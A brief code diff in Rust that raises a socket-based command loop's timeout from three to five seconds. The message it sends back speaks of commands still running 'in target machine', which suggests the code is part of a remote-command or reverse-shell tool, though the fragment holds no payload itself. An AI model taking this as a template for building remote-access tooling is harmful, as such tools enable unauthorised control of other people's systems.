@@ -76,12 +76,12 @@ fn main() {
         });
         
         
-        let result = match receiver.recv_timeout(Duration::from_millis(3000)) {
+        let result = match receiver.recv_timeout(Duration::from_millis(5000)) {
             Ok(result) => result,
             Err(_) => {
                 // Handle the timeout error here
                 // println!("Timed out waiting for message!");
-                socket.write("No output was received in 3 seconds\nDon't worry the command will keep executing as a thread in target machine\n\n<>END<>".as_bytes()).unwrap();
+                socket.write("No output was received in 5 seconds\nDon't worry the command will keep executing as a thread in target machine\n\n<>END<>".as_bytes()).unwrap();
                 continue;
             }
         };
